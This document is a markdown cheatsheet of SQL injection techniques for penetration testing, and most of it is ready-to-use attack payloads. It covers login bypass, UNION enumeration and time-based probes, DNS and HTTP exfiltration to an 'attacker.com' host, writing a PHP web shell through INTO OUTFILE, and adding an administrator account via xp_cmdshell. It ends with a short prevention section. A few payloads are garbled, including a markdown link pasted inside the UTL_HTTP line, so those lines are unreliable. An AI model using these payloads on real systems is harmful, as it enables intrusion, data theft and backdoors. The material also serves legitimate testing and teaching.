# SQL and SQL Injection Cheatsheet

SQL Injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g., to dump the database contents to the attacker). This cheatsheet provides an overview of various SQLi techniques and their use cases in penetration testing.

## Table of Contents

* [Understanding SQL Injection](#understanding-sql-injection)
* [Common SQL Injection Types](#common-sql-injection-types)
    * [In-band SQLi](#in-band-sqli)
        * [Error-based SQLi](#error-based-sqli)
        * [Union-based SQLi](#union-based-sqli)
    * [Inferential (Blind) SQLi](#inferential-blind-sqli)
        * [Boolean-based Blind SQLi](#boolean-based-blind-sqli)
        * [Time-based Blind SQLi](#time-based-blind-sqli)
    * [Out-of-Band SQLi](#out-of-band-sqli)
* [Common Payloads and Techniques](#common-payloads-and-techniques)
    * [Bypassing Authentication](#bypassing-authentication)
    * [Comments](#comments)
    * [Union Attacks (Determining Columns and Data Types)](#union-attacks-determining-columns-and-data-types)
    * [Extracting Database Information](#extracting-database-information)
    * [Reading/Writing Files](#readingwriting-files)
    * [Command Execution](#command-execution)
* [SQL Injection Prevention (Important for Testers to Know)](#sql-injection-prevention-important-for-testers-to-know)

---

## Understanding SQL Injection

SQL Injection occurs when user-supplied input is not properly sanitized or validated and is directly concatenated into an SQL query. This allows an attacker to manipulate the SQL statement, causing the database to perform unintended actions.

**Impact of SQLi:**
* **Confidentiality:** Unauthorized access to sensitive data (user credentials, financial information, personal data).
* **Integrity:** Modification or deletion of database data.
* **Availability:** Denial of service (e.g., deleting tables, shutting down the database).
* **Control:** In some cases, gaining administrative rights to the database or even executing commands on the underlying operating system.

---

## Common SQL Injection Types

SQL Injection attacks are generally categorized into three main types:

### In-band SQLi

The attacker uses the same communication channel to launch the attack and retrieve the results. This is the most common and often easiest to exploit.

#### Error-based SQLi

* **Explanation**: Relies on error messages thrown by the database server to obtain information about the database structure (table names, column names, data types).
* **Use Case**: When the application displays verbose database errors to the user, an attacker can intentionally craft queries that cause errors, revealing details.
* **Payload Example (MySQL/SQL Server):**
    ```sql
    ' OR 1=1 AND (SELECT 1 FROM FOOBAR) --
    -- If FOOBAR doesn't exist, an error message might reveal that.
    ' UNION SELECT 1/0 --
    -- Triggers a division by zero error, which might reveal internal paths or data.
    ```
* **Payload Example (Oracle):**
    ```sql
    ' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x'||(SELECT USER FROM DUAL)||'.malicious.com') --
    -- Can leak data via error messages if the 'x' concatenation creates an invalid hostname.
    ```

#### Union-based SQLi

* **Explanation**: Uses the `UNION` SQL operator to combine the results of multiple `SELECT` statements into a single result, appending the attacker's query results to the original legitimate query's results. Requires knowing the number and data types of columns in the original query.
* **Use Case**: Extracting data from other tables in the database once the number of columns and compatible data types are identified.
* **Payload Example (Determining Number of Columns):**
    ```sql
    ' ORDER BY 1--
    ' ORDER BY 2--
    ...
    ' ORDER BY N--
    -- Keep incrementing N until an error occurs, indicating N-1 is the number of columns.

    ' UNION SELECT NULL,NULL,NULL--
    -- Test with the determined number of NULLs to match column count.
    ```
* **Payload Example (Determining Column Data Types/Extracting Data):**
    ```sql
    ' UNION SELECT 1, 'abc', NULL, 4--
    -- Test different data types (e.g., 'abc' for string, 1 for integer) until no error occurs.
    -- Once types are known, replace NULLs with actual column names to extract data.
    ' UNION SELECT username, password FROM users--
    ```

### Inferential (Blind) SQLi

* **Explanation**: The attacker doesn't directly see the results of the malicious query in the application's response. Instead, they infer information by observing the application's behavior (e.g., page content changes, time delays). This is often slower but equally dangerous.

#### Boolean-based Blind SQLi

* **Explanation**: Sends SQL queries that force the application to return a different result depending on whether a true or false condition is met. The attacker observes changes in the HTTP response (e.g., page content, HTTP status code) to deduce information character by character.
* **Use Case**: When no error messages are displayed, but the page content subtly changes based on the truthfulness of a condition.
* **Payload Example:**
    ```sql
    ' AND 1=2--
    -- If the page changes/shows less content, then ' AND 1=2' evaluated to false.
    ' AND (SELECT SUBSTRING(version(),1,1) = '5')--
    -- If the page is 'normal', the condition is true (MySQL version starts with 5).
    ```

#### Time-based Blind SQLi

* **Explanation**: Sends SQL queries that force the database to wait for a specified amount of time before responding if a condition is true. The attacker observes the response time to infer the truthfulness of the condition.
* **Use Case**: When neither error messages nor content changes are reliable indicators. This is often a last resort due to its slowness.
* **Payload Example (MySQL):**
    ```sql
    ' AND SLEEP(5)--
    -- If the page takes 5 seconds longer to load, it's vulnerable.
    ' AND IF((SELECT SUBSTRING(database(),1,1))='s', SLEEP(5), 0)--
    -- If database name starts with 's', delay for 5 seconds.
    ```
* **Payload Example (SQL Server):**
    ```sql
    '; WAITFOR DELAY '0:0:5'--
    '; IF (SELECT @@version LIKE '%Microsoft%') WAITFOR DELAY '0:0:5'--
    ```
* **Payload Example (PostgreSQL):**
    ```sql
    ' AND pg_sleep(5)--
    ' AND SELECT CASE WHEN (SELECT SUBSTRING(version(),1,1)='9') THEN pg_sleep(5) ELSE 0 END--
    ```
* **Payload Example (Oracle):**
    ```sql
    ' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)=('a')--
    -- This causes a 10-second delay if the pipe message is successfully received.
    ' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL WHERE (ASCII(SUBSTR((SELECT USER FROM DUAL),1,1)))>100)--
    -- Example for conditional delay
    ```

### Out-of-Band SQLi

* **Explanation**: Occurs when an attacker cannot use the same channel to launch the attack and gather results. It relies on the database server's ability to make external network requests (e.g., DNS queries, HTTP requests) to an attacker-controlled server, thereby exfiltrating data.
* **Use Case**: When in-band and inferential techniques are not feasible due to strict filtering or unstable server responses. Requires the database to support functions that trigger external interactions (e.g., `UTL_HTTP` in Oracle, `xp_dirtree` in SQL Server, `LOAD_FILE` in MySQL for SMB shares).
* **Payload Example (SQL Server with `xp_dirtree`):**
    ```sql
    '; EXEC master..xp_dirtree '\\<attacker_ip>\share'--
    -- Attempts to connect to an SMB share, potentially revealing NTLM hash.
    '; EXEC master..xp_dirtree '\\' + (SELECT @@version) + '.attacker.com\share'--
    -- Exfiltrates database version via DNS lookup to attacker-controlled domain.
    ```
* **Payload Example (MySQL with `LOAD_FILE` or DNS functions):**
    ```sql
    ' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\a'))--
    -- Attempts to trigger a DNS lookup for 'database_name.attacker.com'.
    ```
* **Payload Example (Oracle with `UTL_HTTP`/`UTL_TCP`/`UTL_INADDR`):**
    ```sql
    ' UNION SELECT UTL_HTTP.REQUEST('[http://attacker.com/](http://attacker.com/)'||(SELECT USER FROM DUAL)) FROM DUAL--
    -- Sends an HTTP request to attacker's server, leaking the database user.
    ```

---

## Common Payloads and Techniques

### Bypassing Authentication

* **Explanation**: Manipulating login queries to bypass username/password checks.
* **Payloads:**
    * `' OR 1=1-- `
    * `' OR '1'='1`
    * `" OR "1"="1`
    * `admin'--` (logs in as admin if no password is required or if the remaining query is commented out)
    * `admin' /*` (alternative comment for some databases)
    * `' OR 1=1 #` (MySQL specific comment)
* **Use Case**: Gaining access to an application without valid credentials.

### Comments

* **Explanation**: Used to truncate the original SQL query, ignoring parts of it.
* **Types:**
    * `-- ` (SQL standard, note the space after `--`)
    * `#` (MySQL specific)
    * `/* ... */` (Multi-line comment, standard)
* **Use Case**: Disabling parts of the original query, for instance, a password check in a login form: `SELECT * FROM users WHERE username='admin' AND password='<input_password>'` becomes `SELECT * FROM users WHERE username='admin'--'` if input is `admin'--`.

### Union Attacks (Determining Columns and Data Types)

* **Explanation**: Critical step for Union-based SQLi. You need to know how many columns the original query returns and their data types to construct a valid `UNION` query.
* **Techniques:**
    1.  **`ORDER BY` Clause**: Increment the number after `ORDER BY` until an error occurs. The last working number reveals the column count.
        * `' ORDER BY 1-- `
        * `' ORDER BY 2-- `
        * ...
        * `' ORDER BY N--`
    2.  **`UNION SELECT NULL, NULL, ...`**: Once the column count is known, use `NULL` for each column in a `UNION SELECT` statement. Then, replace `NULL` values one by one with a simple string (`'a'`) or integer (`1`) to identify which columns are compatible with string or numeric data types.
        * `' UNION SELECT NULL, NULL, NULL--` (if 3 columns)
        * `' UNION SELECT 1, 'a', NULL--` (to test data types)
* **Use Case**: Laying the groundwork for data extraction using `UNION` queries.

### Extracting Database Information

* **Explanation**: Using specific SQL functions or system tables to get information about the database, tables, and columns.
* **Payloads (General):**
    * **Current User:** `SELECT user()` (MySQL), `SELECT system_user` (SQL Server), `SELECT user` (PostgreSQL), `SELECT USER FROM DUAL` (Oracle)
    * **Database Version:** `SELECT @@version` (MySQL, SQL Server), `SELECT version()` (PostgreSQL), `SELECT banner FROM v$version` (Oracle)
    * **Current Database Name:** `SELECT database()` (MySQL), `SELECT DB_NAME()` (SQL Server), `SELECT current_database()` (PostgreSQL), `SELECT name FROM v$database` (Oracle)
* **Payloads (Schema Enumeration - MySQL/PostgreSQL/SQLite):**
    * **Tables:** `' UNION SELECT 1,table_name,NULL FROM information_schema.tables--`
    * **Columns:** `' UNION SELECT 1,column_name,NULL FROM information_schema.columns WHERE table_name='users'--`
* **Payloads (Schema Enumeration - SQL Server):**
    * **Tables:** `' UNION SELECT 1,name,NULL FROM sysobjects WHERE xtype='U'--` (`xtype='U'` for user tables)
    * **Columns:** `' UNION SELECT 1,name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--`
* **Payloads (Schema Enumeration - Oracle):**
    * **Tables:** `' UNION SELECT 1,table_name,NULL FROM all_tables--`
    * **Columns:** `' UNION SELECT 1,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--`
* **Use Case**: Mapping the database structure, finding sensitive tables (e.g., `users`, `credit_cards`) and columns (e.g., `password`, `ssn`).

### Reading/Writing Files

* **Explanation**: Some database systems (like MySQL and SQL Server) allow reading from and writing to the file system using specific functions.
* **Payloads (MySQL):**
    * **Reading:** `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),NULL--`
    * **Writing (Requires `INTO OUTFILE`/`INTO DUMPFILE` and appropriate permissions):**
        * `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'--`
* **Payloads (SQL Server):**
    * **Reading (using `OPENROWSET` with `BULK`):**
        * `' UNION SELECT 1,2,OPENROWSET(BULK ''C:\Windows\System32\drivers\etc\hosts'', SINGLE_BLOB)--`
    * **Writing (using `xp_cmdshell` with `echo` or `bcp` utility):**
        * `'; EXEC xp_cmdshell 'echo "<?php phpinfo(); ?>" > "C:\inetpub\wwwroot\info.php"'--`
* **Use Case**: Gaining access to system files, deploying web shells for further compromise, or exfiltrating data.

### Command Execution

* **Explanation**: In some highly permissive configurations, an attacker can execute operating system commands directly through SQL Injection. This is often possible if the database user has elevated privileges and certain dangerous functions are enabled.
* **Payloads (SQL Server with `xp_cmdshell`):**
    * `'; EXEC xp_cmdshell 'whoami'--`
    * `'; EXEC xp_cmdshell 'net user pentester TopSecret123! /add'--`
    * `'; EXEC xp_cmdshell 'net localgroup administrators pentester /add'--`
* **Payloads (MySQL - less direct, often via UDFs or `sys_exec`):**
    * Requires writing malicious shared libraries (`.so` or `.dll`) to the server using `INTO DUMPFILE` and then creating user-defined functions (UDFs) to execute them.
* **Use Case**: Full system compromise, privilege escalation, creating backdoors.

---

## SQL Injection Prevention (Important for Testers to Know)

Understanding prevention methods helps penetration testers identify why a vulnerability exists and how to properly report it.

* **Parameterized Queries/Prepared Statements**: This is the most effective defense. SQL code is defined first, and then parameters are passed separately, ensuring that user input is treated as data, not executable code.
    * *Example (PHP PDO)*:
        ```php
        $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
        $stmt->execute(['username' => $username, 'password' => $password]);
        ```
* **Input Validation**:
    * **Whitelisting**: Only allow known good inputs (e.g., allow only numeric digits for an ID field).
    * **Blacklisting (less secure)**: Filter out known bad characters (e.g., quotes, semicolons). This is prone to bypasses.
    * **Escaping Special Characters**: For cases where parameterized queries can't be used (e.g., dynamic table names), escaping characters relevant to the specific database can help, but it's error-prone.
* **Least Privilege**: Database users should only have the minimum necessary permissions. An application user should not connect as `root` or `sa`. If an application only needs to read data, it shouldn't have `INSERT`, `UPDATE`, or `DELETE` privileges.
* **Web Application Firewalls (WAFs)**: Can detect and block common SQLi patterns, providing an additional layer of defense.
* **Error Handling**: Do not display verbose database error messages to users. Log detailed errors on the server side instead. Generic error messages prevent attackers from gaining valuable information about the database structure.
* **Regular Updates and Patching**: Keep database systems, frameworks, and libraries updated to prevent exploitation of known vulnerabilities.
* **Code Review and Automated Scanning**: Regularly review code for SQLi vulnerabilities and use static (SAST) and dynamic (DAST) analysis tools.